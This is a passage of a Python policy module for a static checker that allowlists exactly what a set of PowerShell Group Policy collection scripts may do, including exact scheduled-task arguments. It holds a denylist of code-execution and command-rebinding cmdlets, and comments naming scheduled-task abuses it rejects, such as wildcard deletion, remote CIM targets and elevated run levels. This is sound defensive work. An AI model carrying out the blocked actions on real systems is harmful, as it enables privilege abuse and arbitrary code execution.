                "= (Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
                "param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
            }
        ),
        # read by a binding of $taskargs
        "copyto": frozenset(
            {
                "param",
            }
        ),
        # receiver of .GetNetworkCredential()
        "credential": frozenset(
            {
                "= $null",
                (
                    "= Get-Credential -UserName $ServiceAccount -Message 'Collection task "
                    "credentials (saved only by Windows Task Scheduler)'"
                ),
                "param",
            }
        ),
        # New-ScheduledTaskTrigger argument
        "everydays": frozenset(
            {
                "param 1",
            }
        ),
        # New-ScheduledTaskSettingsSet argument
        "executiontimelimit": frozenset(
            {
                "param [timespan]::FromHours(2)",
            }
        ),
        # read by a binding of $account
        "gmsaaccount": frozenset(
            {
                "param",
            }
        ),
        # read by a binding of $taskargs
        "inventorypath": frozenset(
            {
                "param",
            }
        ),
        # receiver of .Dispose()
        "lock": frozenset(
            {
                (
                    "= [IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                    "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, "
                    "[IO.FileShare]::None)"
                ),
            }
        ),
        # read by a binding of $taskargs
        "logfiles": frozenset(
            {
                "param 5",
            }
        ),
        # read by a binding of $taskargs
        "logmaxbytes": frozenset(
            {
                "param 5242880",
            }
        ),
        # write root
        "marker": frozenset(
            {
                "= Join-Path $OutputRoot '.gpo-lens-collection-owner'",
                "arg $marker",
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                "= [IO.Path]::GetFullPath($OutputRoot)",
                "arg $OutputRoot",
                "param",
            }
        ),
        # read by a binding of $bytes
        "previousbytes": frozenset(
            {
                "= $null",
                "= Read-GpoLensOwnerMarkerBytes -Marker $marker",
            }
        ),
        # New-ScheduledTask argument
        "principal": frozenset(
            {
                (
                    "= New-ScheduledTaskPrincipal -UserId $account -LogonType Password "
                    "-RunLevel Limited"
                ),
            }
        ),
        # dynamic invocation & $RegisterTask
        "registertask": frozenset(
            {
                (
                    "arg { if ($GmsaAccount) { Register-ScheduledTask -TaskName $TaskName "
                    "-InputObject $task -Force | Out-Null } else { Register-ScheduledTask "
                    "-TaskName $TaskName -InputObject $task -User $ServiceAccount -Password "
                    "$taskPassword -Force | Out-Null } }"
                ),
                "param",
            }
        ),
        # read by a binding of $taskargs
        "retention": frozenset(
            {
                "param 14",
            }
        ),
        # read by a binding of $taskargs
        "runner": frozenset(
            {
                (
                    "= (Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
                    "'Run-GpoLensCollection.ps1')).ProviderPath"
                ),
            }
        ),
        # New-ScheduledTaskTrigger argument
        "scheduletime": frozenset(
            {
                "= [datetime]::MinValue",
                (
                    "ref [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)"
                ),
            }
        ),
        # Register-ScheduledTask argument
        "serviceaccount": frozenset(
            {
                "param",
            }
        ),
        # New-ScheduledTask argument
        "settings": frozenset(
            {
                (
                    "= New-ScheduledTaskSettingsSet -ExecutionTimeLimit $ExecutionTimeLimit ` "
                    "-MultipleInstances IgnoreNew -StartWhenAvailable"
                ),
            }
        ),
        # Register-ScheduledTask argument
        "task": frozenset(
            {
                (
                    "= New-ScheduledTask -Action $action -Trigger $trigger -Principal "
                    "$principal -Settings $settings ` -Description 'Read-only GPO export, "
                    "bounded retention, rotating logs and optional ZIP delivery.'"
                ),
            }
        ),
        # New-ScheduledTaskAction argument
        "taskargs": frozenset(
            {
                (
                    "+= ' -CopyTo ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $CopyTo))"
                ),
                (
                    "+= ' -InventoryPath ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $InventoryPath))"
                ),
                (
                    "= '-NoProfile -NonInteractive -File ' + (ConvertTo-GpoLensTaskArgument "
                    "$runner) + ' -CollectorPath ' + (ConvertTo-GpoLensTaskArgument "
                    "$CollectorPath) + ' -OutputRoot ' + (ConvertTo-GpoLensTaskArgument "
                    "$OutputRoot) + ' -TaskName ' + (ConvertTo-GpoLensTaskArgument $TaskName) "
                    '+ " -Retention $Retention -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"'
                ),
            }
        ),
        # Unregister-ScheduledTask argument
        "taskname": frozenset(
            {
                "arg $TaskName",
                "param",
                "param 'GpoLensCollection'",
            }
        ),
        # Register-ScheduledTask argument
        "taskpassword": frozenset(
            {
                "= $Credential.GetNetworkCredential().Password",
                "= $null",
            }
        ),
        # New-ScheduledTask argument
        "trigger": frozenset(
            {
                "= New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At $scheduleTime",
            }
        ),
        # New-ScheduledTaskAction argument
        "windowsroot": frozenset(
            {
                "= if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }",
            }
        ),
    },
}

# Allowlisted instance method -> the receiver variables it may be called on
# (casefolded). A call on any other receiver fails (Sol instance_delete,
# DeepSeek NB-1 ADSI.CopyTo). Calls whose receiver is a type literal (static
# dispatch, receiver_var null) are screened only by the type denylist.
INSTANCE_RECEIVERS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        "Replace": frozenset({"f"}),
        "Substring": frozenset({"f"}),
        "Dispose": frozenset({"zip"}),
        "Add": frozenset(
            {"collectionerrors", "knownids", "successsections", "failedsections", "allsids"}
        ),
        "Trim": frozenset({"_", "gpc", "pf"}),
        "Contains": frozenset({"knownids"}),
        "Translate": frozenset({"sidobj"}),
        "Split": frozenset({"dom"}),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {
        "Add": frozenset({"allsids"}),
        "GetSecurityDescriptorSddlForm": frozenset({"sd"}),
        "Translate": frozenset({"sidobj"}),
    },
    "Run-GpoLensCollection.ps1": {
        "Substring": frozenset({"line", "_", "newest"}),
        "GetByteCount": frozenset({"encoding"}),
        "GetEntry": frozenset({"zip"}),
        "Dispose": frozenset({"zip", "stream", "lock"}),
        "Push": frozenset({"pending"}),
        "Pop": frozenset({"pending"}),
        "Add": frozenset({"ids"}),
        "ContainsKey": frozenset({"previous"}),
        "Delete": frozenset({"entry"}),
        "CreateEntry": frozenset({"zip"}),
        "Open": frozenset({"entry"}),
        "Write": frozenset({"stream"}),
    },
    "GpoLensCollectionMarker.ps1": {
        "ToInt64": frozenset({"stream"}),
        "DangerousGetHandle": frozenset({"stream"}),
        "CopyTo": frozenset({"stream"}),
        "ToArray": frozenset({"bytes"}),
        "Dispose": frozenset({"bytes", "stream"}),
        "Write": frozenset({"stream"}),
    },
    "Register-GpoLensCollection.ps1": {
        "Dispose": frozenset({"lock"}),
        "ShouldProcess": frozenset({"pscmdlet"}),
        "GetNetworkCredential": frozenset({"credential"}),
    },
}

# Register-GpoLensCollection is the only script that writes a scheduled task.
# Each task cmdlet call must match one of these EXACT argument vectors (a frozen
# set of (parameter, normalized value) pairs, switch params valued None). An
# extra, missing or changed argument — a wildcard `-TaskName '*'`, a `-CimSession`
# remote target, `-RunLevel Highest`, a different `-Execute`/`-Argument` — matches
# no vector and fails (Sol task_abuse / taskname / unregister / cimsession /
# runlevel; DeepSeek NB-2). `Unregister-ScheduledTask` is included, so a
# wildcard deletion is rejected.
_PS = '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"'
TaskVector = frozenset[tuple[str, str | None]]
TASK_ARG_VECTORS: dict[str, frozenset[TaskVector]] = {
    "New-ScheduledTaskAction": frozenset(
        {
            frozenset(
                {("Execute", _PS), ("Argument", "$taskArgs"), ("WorkingDirectory", "$PSScriptRoot")}
            )
        }
    ),
    "New-ScheduledTaskPrincipal": frozenset(
        {frozenset({("UserId", "$account"), ("LogonType", "Password"), ("RunLevel", "Limited")})}
    ),
    "New-ScheduledTaskTrigger": frozenset(
        {frozenset({("Daily", None), ("DaysInterval", "$EveryDays"), ("At", "$scheduleTime")})}
    ),
    "New-ScheduledTaskSettingsSet": frozenset(
        {
            frozenset(
                {
                    ("ExecutionTimeLimit", "$ExecutionTimeLimit"),
                    ("MultipleInstances", "IgnoreNew"),
                    ("StartWhenAvailable", None),
                }
            )
        }
    ),
    "New-ScheduledTask": frozenset(
        {
            frozenset(
                {
                    ("Action", "$action"),
                    ("Trigger", "$trigger"),
                    ("Principal", "$principal"),
                    ("Settings", "$settings"),
                    (
                        "Description",
                        "'Read-only GPO export, bounded retention, rotating logs and "
                        "optional ZIP delivery.'",
                    ),
                }
            )
        }
    ),
    "Register-ScheduledTask": frozenset(
        {
            frozenset({("TaskName", "$TaskName"), ("InputObject", "$task"), ("Force", None)}),
            frozenset(
                {
                    ("TaskName", "$TaskName"),
                    ("InputObject", "$task"),
                    ("User", "$ServiceAccount"),
                    ("Password", "$taskPassword"),
                    ("Force", None),
                }
            ),
        }
    ),
    "Unregister-ScheduledTask": frozenset(
        {frozenset({("TaskName", "$TaskName"), ("Confirm", "$false")})}
    ),
}
_TASK_ACTION_SCRIPT = "Register-GpoLensCollection.ps1"

# ---------------------------------------------------------------------------
# Round-4 closed sets (both reviewers' round-3 findings). Strict default: what
# cannot be positively pinned is refused.
# ---------------------------------------------------------------------------

# AST node types the collectors may contain: exactly the ones they use today.
# Classes/enums, DSC configurations, dynamic keywords, data sections, traps,
# `$using:`, pipeline chains (&&/||), ternaries and parse-error nodes are all
# refused rather than reasoned about.
ALLOWED_NODE_TYPES = frozenset(
    {
        "ArrayExpressionAst",
        "ArrayLiteralAst",
        "AssignmentStatementAst",
        "AttributeAst",
        "BinaryExpressionAst",
        "CatchClauseAst",
        "CommandAst",
        "CommandExpressionAst",
        "CommandParameterAst",
        "ConstantExpressionAst",
        "ContinueStatementAst",
        "ConvertExpressionAst",
        "ExitStatementAst",
        "ExpandableStringExpressionAst",
        "FileRedirectionAst",
        "ForEachStatementAst",
        "ForStatementAst",
        "FunctionDefinitionAst",
        "HashtableAst",
        "IfStatementAst",
        "IndexExpressionAst",
        "InvokeMemberExpressionAst",
        "MemberExpressionAst",
        "MergingRedirectionAst",
        "NamedAttributeArgumentAst",
        "NamedBlockAst",
        "ParamBlockAst",
        "ParameterAst",
        "ParenExpressionAst",
        "PipelineAst",
        "ReturnStatementAst",
        "ScriptBlockAst",
        "ScriptBlockExpressionAst",
        "StatementBlockAst",
        "StringConstantExpressionAst",
        "SubExpressionAst",
        "SwitchStatementAst",
        "ThrowStatementAst",
        "TryStatementAst",
        "TypeConstraintAst",
        "TypeExpressionAst",
        "UnaryExpressionAst",
        "VariableExpressionAst",
        "WhileStatementAst",
    }
)

# Commands that can never be allowlisted for a collector, whatever a policy
# says: they rebind command resolution (aliases, functions, drives, location),
# write variables by name, load or run code, or register engine callbacks.
FORBIDDEN_COMMANDS = frozenset(
    {
        "Add-PSSnapin",
        "Clear-Item",
        "Clear-Variable",
        "Export-Alias",
        "Import-Alias",
        "Import-Module",
        "Invoke-Command",
        "Invoke-Expression",
        "Invoke-Item",
        "New-Alias",
        "New-Module",
        "New-PSDrive",
        "New-Variable",
        "Pop-Location",
        "Push-Location",
        "Register-EngineEvent",
        "Register-ObjectEvent",
        "Remove-Variable",
        "Set-Alias",
        "Set-Item",
        "Set-ItemProperty",
        "Set-Location",
        "Set-PSBreakpoint",
        "Set-Variable",
        "Start-Job",
        "Start-Process",
        "Start-ThreadJob",
        "Update-FormatData",
        "Update-TypeData",
    }
)

# Automatic and preference variables. The engine reads them, so binding one
# changes how *other* statements behave ($PSDefaultParameterValues injects
# parameters into later calls; $PSModuleAutoLoadingPreference/$ErrorAction-
# Preference/...); a write is refused unless it is in SPECIAL_BINDINGS. Any
# variable named *Preference is treated the same way.
_SPECIAL_VARIABLES = frozenset(
    {
        "$",
        "?",
        "^",
        "_",
        "args",
        "consolefilename",
        "enabledexperimentalfeatures",
        "error",
        "errorview",
        "event",
        "eventargs",
        "eventsubscriber",
        "executioncontext",
        "false",
        "foreach",
        "formatenumerationlimit",
        "home",
        "host",
        "input",
        "iscoreclr",
        "islinux",
        "ismacos",
        "iswindows",
        "lastexitcode",
        "logcommandhealthevent",
        "logcommandlifecycleevent",
        "logenginehealthevent",
        "logenginelifecycleevent",
        "logproviderhealthevent",
        "logproviderlifecycleevent",
        "matches",
        "maximumaliascount",
        "maximumdrivecount",
        "maximumerrorcount",
        "maximumfunctioncount",
        "maximumhistorycount",
        "maximumvariablecount",
        "myinvocation",
        "nestedpromptlevel",
        "null",
        "ofs",
        "outputencoding",
        "pid",
        "profile",
        "psboundparameters",
        "pscmdlet",
        "pscommandpath",
        "psculture",
        "psdebugcontext",
        "psdefaultparametervalues",
        "psedition",
        "psemailserver",
        "pshome",
        "psitem",
        "psnativecommandargumentpassing",
        "psnativecommanduseerroractionpreference",
        "psscriptroot",
        "pssenderinfo",
        "pssessionapplicationname",
        "pssessionconfigurationname",
        "pssessionoption",
        "psstyle",
        "psuiculture",
        "psversiontable",
        "pwd",
        "sender",
        "shellid",
        "stacktrace",
        "switch",
        "this",
        "transcript",
        "true",
    }
)
# Never referenced at all (read or write): engine-wide parameter injection,
# module auto-loading, and the engine object itself.
FORBIDDEN_VARIABLE_REFS = frozenset(
    {"psdefaultparametervalues", "psmoduleautoloadingpreference", "executioncontext"}
)
# The only automatic/preference variable bindings the collectors make.
SPECIAL_BINDINGS: dict[str, frozenset[tuple[str, str]]] = {
    "Export-GpoEstate.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-GroupMembers.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "Export-Principals.ps1": frozenset(
        {
            ("erroractionpreference", "= 'Stop'"),
            ("matches", "= [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')"),
            ("matches", "= [regex]::Matches($sddl, 'S-1-[0-9]+-[0-9-]+')"),
        }
    ),
    "Run-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({("erroractionpreference", "= 'Stop'")}),
}
# A variable may be the root of an index write (`$h[$k] = ...`) only here.
INDEX_ASSIGNMENT_ROOTS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"principals", "groupmembers"}),
    "Export-GroupMembers.ps1": frozenset({"groupmembers"}),
    "Export-Principals.ps1": frozenset({"principals"}),
    "Run-GpoLensCollection.ps1": frozenset({"previous"}),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# The only targets of variable-writing common parameters (literal names).
COMMON_PARAM_TARGETS: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset({"zipenumerr", "srcerr"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset(),
}
# Exact set of functions each script defines. A redefinition (`function
# Assert-GpoLensRegularTree {}` later in the file) or a function shadowing an
# allowlisted cmdlet (`function Get-Item { ... }`) is not in the set.
LOCAL_FUNCTIONS: dict[str, tuple[str, ...]] = {
    "Export-GpoEstate.ps1": ("New-GpoExportZip", "Set-SectionProgress"),
    "Export-GroupMembers.ps1": (),
    "Export-Principals.ps1": (),
    "Run-GpoLensCollection.ps1": (
        "Write-GpoLensCollectionLog",
        "Get-GpoLensCompletedExports",
        "Assert-GpoLensRegularTree",
        "Assert-GpoLensCollectionOwner",
        "Invoke-GpoLensCollection",
    ),
    "GpoLensCollectionMarker.ps1": (
        "Read-GpoLensOwnerMarkerBytes",
        "Write-GpoLensOwnerMarkerBytes",
    ),
    "Register-GpoLensCollection.ps1": (
        "ConvertTo-GpoLensTaskArgument",
        "ConvertTo-GpoLensAbsolutePath",
        "Set-GpoLensCollectionOwner",
    ),
}
# Pinned write/exec operations with their control-flow context (see
# check_guarded_ops). Each entry is (normalized operation text, context from
# outermost to innermost).
GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "Export-GpoEstate.ps1": (
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "try",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "catch []",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $OutputRoot",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            "Remove-Item $testFile -Force",
            ("try",),
        ),
        (
            "New-Item -ItemType Directory -Force -Path (Join-Path $out 'reports')",
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-GPOReport -All -ReportType Xml -Path (Join-Path $out 'AllGPOs.xml') "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                "Get-GPOReport -Guid $gpo.Id -ReportType Xml ` -Path (Join-Path $out "
                '"reports\\${safe}__$($gpo.Id).xml") -ErrorAction Stop'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-inventory.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-metadata.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gp-inheritance.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'ou-tree.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'sites.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'wmi-filters.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'principals.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'group-members.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $dest",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "try",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction "
                "SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "[System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "$f.FullName.Substring($rootLen).Replace('\\', '/')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            (
                "[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile( $zip, "
                "$f.FullName, $entryName)"
            ),
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            ("try",),
        ),
    ),
    "Export-GroupMembers.ps1": (
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
    ),
    "Export-Principals.ps1": (
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
    ),
    "Run-GpoLensCollection.ps1": (
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Remove-Item -LiteralPath $next -Force -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $next) after []",
            ),
        ),
        (
            "Move-Item -LiteralPath $old -Destination $next -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $old) after []",
            ),
        ),
        (
            "& $CollectorPath -OutputRoot $OutputRoot *>&1",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Remove-Item -LiteralPath $newest.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $CopyTo -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Copy-Item -LiteralPath $newest.FullName -Destination $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Move-Item -LiteralPath $partial -Destination $delivery -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Remove-Item -LiteralPath $partial -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if (Test-Path -LiteralPath $partial) after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            "Remove-Item -LiteralPath $folder -Recurse -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            "[IO.File]::AppendAllText($LogPath, $line, $encoding)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
            ),
        ),
        (
            (
                "[IO.File]::WriteAllBytes((Join-Path $exportDir 'gpo-inventory.json'), "
                "$inventoryBytes)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Delete()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "if ($entry) after []",
            ),
        ),
        (
            "$zip.CreateEntry('gpo-inventory.json')",
            (
                "function Invoke-GpoLensCollection",
                (
